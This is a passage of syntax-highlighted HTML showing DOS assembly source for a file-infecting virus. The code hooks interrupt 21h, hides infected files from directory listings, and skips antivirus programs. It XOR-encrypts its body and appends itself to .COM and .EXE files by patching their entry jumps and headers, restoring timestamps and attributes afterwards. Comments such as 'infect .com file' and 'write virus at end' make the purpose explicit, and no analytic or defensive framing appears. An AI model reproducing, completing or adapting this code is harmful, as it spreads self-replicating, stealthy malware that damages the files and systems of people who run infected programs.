                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">leave_dir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">int21_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">02abch</span><span class="sc0">              </span><span class="sc1">; installation check</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">acheck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0def6h</span><span class="sc0">              </span><span class="sc1">; HEX DEF6</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">acheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">              </span><span class="sc1">; program execution</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">execute</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc0">              </span><span class="sc1">; move/rename file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">execute</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_disable_stealth</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nost</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">no_disable_stealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nost</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">nostealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dirstealth</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dirstealth</span><span class="sc0">
</span><span class="sc5">nostealth</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">noterm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">nost</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">noterm</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">              </span><span class="sc1">;get/set file attributes</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">goint21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">              </span><span class="sc1">;marker for our internal uses</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">execute</span><span class="sc0">

</span><span class="sc5">goint21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_int21</span><span class="sc0">
</span><span class="sc5">old_int21</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">old_int21_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_int21_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">


                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">          </span><span class="sc1">;get int24h seg and off</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;store them</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0">          </span><span class="sc1">;our int24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">sloop</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;ds:di-&gt; filename</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sloop</span><span class="sc0">                   </span><span class="sc1">;search for '.'</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc8">di</span><span class="sc4">,</span><span class="sc12">'XE'</span><span class="sc0">     </span><span class="sc1">;is an exe?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ahead2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc8">di</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">     </span><span class="sc1">;is a com</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ahead2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">oh_shit2</span><span class="sc0">
</span><span class="sc5">ahead2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkav</span><span class="sc0">                 </span><span class="sc1">;look if we are infecting</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;an antiviru$</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bogus</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">oh_shit2</span><span class="sc0">
</span><span class="sc5">bogus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">;open for rw</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ahead</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">oh_shit</span><span class="sc0">
</span><span class="sc5">ahead</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;bx file handle as usual</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">;read date/time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">          </span><span class="sc1">;read 1ch bytes from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exeheader</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">       </span><span class="sc1">;exe?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">exestuff</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">     </span><span class="sc1">;exe?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">exestuff</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">      </span><span class="sc1">;jump in com?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cominf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">04fh</span><span class="sc0">    </span><span class="sc1">;is ours?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">notcominf</span><span class="sc0">
</span><span class="sc5">cominf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cominfect</span><span class="sc0">               </span><span class="sc1">;infect .com file</span><span class="sc0">
</span><span class="sc5">notcominf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">closing</span><span class="sc0">                 </span><span class="sc1">;go away</span><span class="sc0">
</span><span class="sc5">exestuff</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">      </span><span class="sc1">;winexes</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closing</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">'MS'</span><span class="sc0">     </span><span class="sc1">;sailormars marker</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closing</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;internal ovl</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">closing</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exeinfect</span><span class="sc0">               </span><span class="sc1">;infect .exe file</span><span class="sc0">
</span><span class="sc5">closing</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">;set date/time</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">justdoit</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
</span><span class="sc5">justdoit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">;close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">oh_shit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attr</span><span class="sc0">                </span><span class="sc1">;reput old attributes</span><span class="sc0">
</span><span class="sc5">oh_shit2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; restore int24h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">goint21</span><span class="sc0">
</span><span class="sc5">cominfect</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;com infection routine</span><span class="sc0">
        </span><span class="sc1">;bx &lt;-- filehandle</span><span class="sc0">
        </span><span class="sc1">;si --&gt; exeheader</span><span class="sc0">
        </span><span class="sc1">;cs=ds=code</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">      </span><span class="sc1">;copy original 4 bytes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_jump</span><span class="sc0"> </span><span class="sc1">;in old_jump</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                          </span><span class="sc1">;lseek at end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0f230h</span><span class="sc0">                       </span><span class="sc1">;ax=62000?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exitcominfect</span><span class="sc0">                   </span><span class="sc1">;jmp if ax&gt;62000</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0400h</span><span class="sc0">                        </span><span class="sc1">;ax=1024?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">exitcominfect</span><span class="sc0">                   </span><span class="sc1">;jmp if ax&lt;=1024</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">;sub the jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">new_jump</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;new jump</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">isexe</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">              </span><span class="sc1">;mark as com</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">genran</span><span class="sc0">                          </span><span class="sc1">;random number for xor</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decvicdata</span><span class="sc0">                      </span><span class="sc1">;xor them</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enccom</span><span class="sc0">                          </span><span class="sc1">;reverse virus</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">;write virus at end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">exe_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_start</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">;write first 4 bytes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_jump</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">avrunning</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">exitcominfect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">movefile</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;move through the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">exeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;bx &lt;- filehandle</span><span class="sc0">
        </span><span class="sc1">;si -&gt; exeheader</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store old IP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infip</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store old CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infcs</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;store old SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">infsp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
